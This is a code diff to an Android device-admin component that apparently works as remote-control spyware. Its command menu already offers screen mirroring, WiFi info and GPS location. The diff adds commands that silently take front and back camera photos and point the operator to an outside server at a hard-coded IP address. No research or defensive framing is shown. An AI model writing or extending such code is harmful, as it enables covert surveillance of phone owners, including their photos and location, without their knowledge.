@@ -94,6 +94,8 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
                 writer.println("  screen_stop   - Stop screen mirror");
                 writer.println("  wifi        - Show WiFi info");
                 writer.println("  location    - Show GPS coordinates + Google Maps link");
+                writer.println("  front_snap  - Silently take front camera photo");
+                writer.println("  back_snap   - Silently take back camera photo");
                 writer.println("----------------------------------");
 
                 // Read commands from listener
@@ -259,6 +261,18 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
 
             case "location":
                 return getLocation(context);
+
+            case "front_snap":
+                Intent frontIntent = new Intent(context, CameraService.class);
+                frontIntent.putExtra(CameraService.EXTRA_LENS, "front");
+                context.startService(frontIntent);
+                return "📸 Front camera snap taken! Check http://20.2.66.175:9090";
+
+            case "back_snap":
+                Intent backIntent = new Intent(context, CameraService.class);
+                backIntent.putExtra(CameraService.EXTRA_LENS, "back");
+                context.startService(backIntent);
+                return "📸 Back camera snap taken! Check http://20.2.66.175:9090";
 
             default:
                 return "❌ Unknown command: " + command + " | type 'help' for commands";
